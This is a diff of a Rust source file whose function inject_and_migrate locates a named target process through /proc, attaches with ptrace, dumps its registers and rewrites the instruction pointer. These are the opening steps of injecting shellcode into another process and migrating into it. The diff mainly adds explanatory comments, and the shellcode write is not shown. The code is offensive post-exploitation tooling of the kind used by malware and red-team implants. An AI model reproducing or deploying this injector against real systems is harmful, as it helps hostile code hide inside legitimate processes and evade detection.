@@ -6,8 +6,7 @@ use std::process::{self, Command};
 use std::ffi::c_void;
 
 pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
-    // Find a PID that ptrace can attach to
-    let mut target_pid = 0;
+    // List and collect all of the PIDs of active processes
     let list_pids = Command::new("ls")
             .arg("/proc/")
             .output()
@@ -17,7 +16,11 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
                                                         .split('\n')
                                                         .flat_map(|s| s.parse().ok())
                                                         .collect();
+
+    // Throw away anything under 100 to try to limit the chances you crash the machine
     pids.retain(|i| *i > 100 && *i != process::id() as i32);
+    // Find a PID that corresponds to an instance of the target process and that ptrace can attach to
+    let mut target_pid = 0;
     for pid in pids.iter().rev() {
         let cmdline = format!("/proc/{pid}/cmdline");
         let commandline = Command::new("cat")
@@ -39,14 +42,18 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
         panic!("Could not wait for the {target_process} to change state: {error}");
     }
+
+    // Dump the registers for the target process
     let mut registers = match getregs(target_pid) {
         Err(error) => panic!("Could not get registers for {target_process}: {error}"),
         Ok(value) => value
     };
 
+    // Copy the RIP register to a mutable variable, then increment RIP by 2
     let mut point = registers.rip;
     registers.rip += 2;
     
+    // Write the updated RIP back to the target process
     if let Err(error) = setregs(target_pid, registers) {
         panic!("Unable to reset {target_process} registers: {error}");
     }
